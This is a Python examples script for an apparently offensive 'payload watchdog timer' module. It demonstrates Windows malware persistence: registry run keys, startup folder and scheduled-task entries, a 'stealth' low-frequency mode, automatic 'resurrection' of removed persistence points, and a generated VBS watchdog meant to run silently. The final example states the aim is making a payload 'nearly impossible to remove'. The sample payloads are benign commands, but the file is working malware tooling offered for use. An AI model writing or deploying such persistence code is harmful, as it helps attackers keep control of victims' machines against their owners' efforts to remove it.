#!/usr/bin/env python3
"""
Payload Watchdog Timer - Usage Examples
Demonstrates all features and integration patterns
"""

import time
import logging
from payload_watchdog_timer import (
    create_watchdog_timer,
    PayloadWatchdogTimer,
    WatchdogConfig,
)

# Configure logging for examples
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


def example_1_basic_monitoring():
    """Example 1: Basic watchdog monitoring"""
    print("\n" + "="*70)
    print("Example 1: Basic Watchdog Monitoring")
    print("="*70)

    # Create watchdog
    watchdog = create_watchdog_timer(
        payload_command="cmd.exe /c whoami"
    )

    # Start monitoring
    watchdog.start()
    print("[*] Watchdog started")

    # Let it run for 5 seconds
    time.sleep(5)

    # Check status
    status = watchdog.get_status()
    print(f"\n[+] Watchdog Status:")
    print(f"    Running: {status['running']}")
    print(f"    Checks: {status['total_checks']}")
    print(f"    Detections: {status['detections']}")
    print(f"    Uptime: {status['uptime_seconds']}s")

    # Stop watchdog
    watchdog.stop()
    print("\n[*] Watchdog stopped")


def example_2_aggressive_monitoring():
    """Example 2: Aggressive monitoring (high frequency checks)"""
    print("\n" + "="*70)
    print("Example 2: Aggressive Monitoring")
    print("="*70)

    watchdog = create_watchdog_timer(
        payload_command="powershell.exe -NoProfile -Command 'Get-Process'",
        check_interval=10,      # Check every 10 seconds
        max_restarts=20,        # Allow up to 20 resurrection attempts
        restart_delay=2,        # Quick 2-second delay before resurrection
    )

    print("[*] Starting aggressive monitoring")
    print("    Check interval: 10 seconds")
    print("    Max restarts: 20")
    print("    Restart delay: 2 seconds")

    watchdog.start()

    # Monitor for 30 seconds
    for i in range(3):
        time.sleep(10)
        status = watchdog.get_status()
        print(f"[*] {status['total_checks']} checks completed, "
              f"{status['detections']} removals detected")

    watchdog.stop()
    print("[*] Monitoring stopped")


def example_3_stealth_monitoring():
    """Example 3: Stealth monitoring (low frequency checks)"""
    print("\n" + "="*70)
    print("Example 3: Stealth Monitoring")
    print("="*70)

    watchdog = create_watchdog_timer(
        payload_command="notepad.exe",
        check_interval=60,      # Check every 60 seconds
        max_restarts=5,         # Only 5 resurrection attempts
        restart_delay=15,       # Wait 15 seconds before resurrection
        persistence_methods=[
            "registry_hkcu",
            "startup_folder",
        ]
    )

    print("[*] Starting stealth monitoring")
    print("    Check interval: 60 seconds")
    print("    Max restarts: 5")
    print("    Restart delay: 15 seconds")
    print("    Methods: registry_hkcu, startup_folder")

    watchdog.start()
    time.sleep(5)

    status = watchdog.get_status()
    print(f"\n[+] Status: Running={status['running']}, Checks={status['total_checks']}")

    watchdog.stop()


def example_4_event_callbacks():
    """Example 4: Using event callbacks"""
    print("\n" + "="*70)
    print("Example 4: Event Callbacks")
    print("="*70)

    watchdog = create_watchdog_timer("calc.exe")

    # Define callbacks
    def on_start():
        print("[!] Watchdog started")

    def on_check(data):
        print(f"[*] Check #{data['stats']['total_checks']}: "
              f"{len(data['checked_methods'])} methods checked")
        if data['removed_methods']:
            print(f"    [!] Removed: {data['removed_methods']}")

    def on_restart(data):
        print(f"[!] Payload resurrected (attempt {data['restart_count']})")
        print(f"    Restored: {data['restored_methods']}")

    def on_stop():
        print("[*] Watchdog stopped")

    def on_failure(data):
        print(f"[ERROR] {data['error']}")

    # Register callbacks
    watchdog.register_callback('on_start', on_start)
    watchdog.register_callback('on_check', on_check)
    watchdog.register_callback('on_restart', on_restart)
    watchdog.register_callback('on_stop', on_stop)
    watchdog.register_callback('on_failure', on_failure)

    # Run with callbacks
    watchdog.start()
    time.sleep(3)
    watchdog.stop()


def example_5_selective_method_monitoring():
    """Example 5: Monitor only specific persistence methods"""
    print("\n" + "="*70)
    print("Example 5: Selective Method Monitoring")
    print("="*70)

    watchdog = create_watchdog_timer(
        payload_command="cmd.exe /c ipconfig",
        persistence_methods=[
            "registry_hkcu",
            "registry_hklm",
            "scheduled_task",
        ]
    )

    print("[*] Monitoring specific methods:")
    for method in watchdog.config.persistence_methods:
        print(f"    - {method}")

    watchdog.start()
    time.sleep(3)

    status = watchdog.get_status()
    print(f"\n[+] Persistence state:")
    for method, state in status['persistence_state'].items():
        exists = "✓" if state['exists'] else "✗"
        print(f"    {exists} {method}")

    watchdog.stop()


def example_6_vbs_code_generation():
    """Example 6: Generate VBS watchdog script"""
    print("\n" + "="*70)
    print("Example 6: VBS Code Generation")
    print("="*70)

    watchdog = create_watchdog_timer(
        payload_command="powershell.exe -Command 'Get-Process'",
        check_interval=30,
        max_restarts=10,
    )

    # Generate VBS code
    vbs_code = watchdog.get_vbs_watchdog_code()

    print(f"[+] Generated VBS watchdog script ({len(vbs_code)} chars)")
    print(f"\n[+] VBS Code Preview:")
    print("-" * 70)
    print(vbs_code[:500] + "...")
    print("-" * 70)

    print(f"\n[+] To use this VBS script:")
    print("    1. Save to file: watchdog.vbs")
    print("    2. Run with: cscript watchdog.vbs")
    print("    3. Run in background: cscript //B watchdog.vbs")
    print("    4. Run silently: wscript watchdog.vbs")


def example_7_multiple_watchdogs():
    """Example 7: Run multiple watchdogs simultaneously"""
    print("\n" + "="*70)
    print("Example 7: Multiple Watchdogs")
    print("="*70)

    # Create multiple watchdogs
    watchdog1 = create_watchdog_timer(
        payload_command="cmd.exe /c echo 1",
        check_interval=5
    )
    watchdog2 = create_watchdog_timer(
        payload_command="cmd.exe /c echo 2",
        check_interval=5
    )
    watchdog3 = create_watchdog_timer(
        payload_command="cmd.exe /c echo 3",
        check_interval=5
    )

    print("[*] Starting 3 watchdogs...")
    watchdog1.start()
    watchdog2.start()
    watchdog3.start()

    time.sleep(3)

    print("[+] Status of all watchdogs:")
    print(f"    Watchdog 1: Checks={watchdog1.get_status()['total_checks']}")
    print(f"    Watchdog 2: Checks={watchdog2.get_status()['total_checks']}")
    print(f"    Watchdog 3: Checks={watchdog3.get_status()['total_checks']}")

    watchdog1.stop()
    watchdog2.stop()
    watchdog3.stop()


def example_8_statistics_tracking():
    """Example 8: Track and analyze statistics"""
    print("\n" + "="*70)
    print("Example 8: Statistics Tracking")
    print("="*70)

    watchdog = create_watchdog_timer("calc.exe")

    # Start monitoring
    watchdog.start()
    time.sleep(3)

    # Get detailed status with statistics
    status = watchdog.get_status()

    print("[+] Watchdog Statistics:")
    print(f"    Total Checks: {status['total_checks']}")
    print(f"    Detections: {status['detections']}")
    print(f"    Resurrections: {status['resurrections']}")
    print(f"    Failures: {status['failures']}")
    print(f"    Uptime: {status['uptime_seconds']} seconds")
    print(f"    Restart Count: {status['restart_count']}/{status['max_restarts']}")

    print(f"\n[+] Configuration:")
    print(f"    Payload: {status['payload_command']}")
    print(f"    Check Interval: {status['check_interval']}s")
    print(f"    Max Restarts: {status['max_restarts']}")
    print(f"    Enabled: {status['enabled']}")

    print(f"\n[+] Persistence State:")
    for method, state in status['persistence_state'].items():
        exists = "exists" if state['exists'] else "not found"
        print(f"    {method}: {exists}")

    watchdog.stop()


def example_9_error_handling():
    """Example 9: Error handling and recovery"""
    print("\n" + "="*70)
    print("Example 9: Error Handling")
    print("="*70)

    watchdog = create_watchdog_timer("cmd.exe /c whoami")

    error_count = [0]

    def on_failure(data):
        error_count[0] += 1
        print(f"[!] Error detected: {data['error']}")
        print(f"[*] Total errors: {error_count[0]}")

    watchdog.register_callback('on_failure', on_failure)

    print("[*] Starting watchdog with error tracking...")
    watchdog.start()
    time.sleep(3)

    status = watchdog.get_status()
    print(f"\n[+] Error Summary:")
    print(f"    Caught errors: {error_count[0]}")
    print(f"    Watchdog still running: {status['running']}")

    watchdog.stop()


def example_10_integration_with_persistence():
    """Example 10: Integration with persistence manager"""
    print("\n" + "="*70)
    print("Example 10: Integration with Persistence Manager")
    print("="*70)

    print("[*] This example shows integration with persistence_manager.py")
    print("[*] Normally you would:")
    print("    1. Generate persistence payloads with PersistenceManager")
    print("    2. Create watchdog for same payload command")
    print("    3. Deploy both together for maximum resilience")

    # Simulated usage
    payload_cmd = "powershell.exe -NoProfile -WindowStyle Hidden -Command 'Get-Process'"

    print(f"\n[*] Payload command: {payload_cmd[:60]}...")

    # Create watchdog
    watchdog = create_watchdog_timer(
        payload_command=payload_cmd,
        check_interval=30,
        persistence_methods=[
            "registry_hkcu",
            "registry_hklm",
            "startup_folder",
            "scheduled_task",
        ]
    )

    print("[*] Starting watchdog to protect persistence...")
    watchdog.start()
    time.sleep(2)

    status = watchdog.get_status()
    print(f"\n[+] Watchdog protection enabled:")
    print(f"    Status: {'Active' if status['running'] else 'Inactive'}")
    print(f"    Methods: {len(status['persistence_state'])} being monitored")
    print(f"    Uptime: {status['uptime_seconds']}s")

    watchdog.stop()

    print("\n[*] When deployed:")
    print("    - Persistence manager creates multiple persistence points")
    print("    - Watchdog monitors all points continuously")
    print("    - If any point is removed, watchdog resurrects it")
    print("    - Result: Nearly impossible to remove the payload")


def run_all_examples():
    """Run all examples"""
    examples = [
        ("Basic Monitoring", example_1_basic_monitoring),
        ("Aggressive Monitoring", example_2_aggressive_monitoring),
        ("Stealth Monitoring", example_3_stealth_monitoring),
        ("Event Callbacks", example_4_event_callbacks),
        ("Selective Method Monitoring", example_5_selective_method_monitoring),
        ("VBS Code Generation", example_6_vbs_code_generation),
        ("Multiple Watchdogs", example_7_multiple_watchdogs),
        ("Statistics Tracking", example_8_statistics_tracking),
        ("Error Handling", example_9_error_handling),
        ("Integration with Persistence", example_10_integration_with_persistence),
    ]

    print("\n" + "="*70)
    print("PAYLOAD WATCHDOG TIMER - USAGE EXAMPLES")
    print("="*70)
    print(f"\nRunning {len(examples)} examples...\n")

    for i, (name, example_func) in enumerate(examples, 1):
        try:
            example_func()
        except Exception as e:
            print(f"\n[ERROR] Example {i} ({name}) failed: {e}")
        time.sleep(0.5)

    print("\n" + "="*70)
    print("All examples completed!")
    print("="*70)


if __name__ == "__main__":
    run_all_examples()
